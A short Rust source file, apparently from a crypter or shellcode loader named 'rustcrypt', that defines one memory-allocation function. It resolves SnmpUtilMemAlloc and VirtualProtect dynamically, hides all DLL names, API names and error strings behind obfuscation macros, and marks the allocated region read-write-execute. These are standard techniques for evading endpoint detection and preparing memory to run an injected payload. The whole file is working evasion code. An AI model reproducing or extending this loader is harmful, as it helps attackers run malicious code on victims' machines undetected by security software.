use crate::utils::{load_library, get_proc_address};
#[allow(dead_code)]
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    type SnmpUtilMemAllocFn = unsafe extern "system" fn(n_bytes: u32) -> *mut c_void;
    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    let snmpapi = load_library(obf_lit_bytes!(b"snmpapi.dll\0").as_slice())?;
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    
    let snmp_alloc: SnmpUtilMemAllocFn = core::mem::transmute(get_proc_address(snmpapi, obf_lit_bytes!(b"SnmpUtilMemAlloc\0").as_slice())?);
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);

    let p = snmp_alloc(size as u32);
    if p.is_null() {
        return Err(obf_lit!("SnmpUtilMemAlloc failed").to_string());
    }

    let mut old_protect = 0u32;
    let ok = virtual_protect(p, size, 0x40, &mut old_protect);
    if ok == 0 {
        return Err(obf_lit!("VirtualProtect failed").to_string());
    }

    Ok(p as *mut u8)
}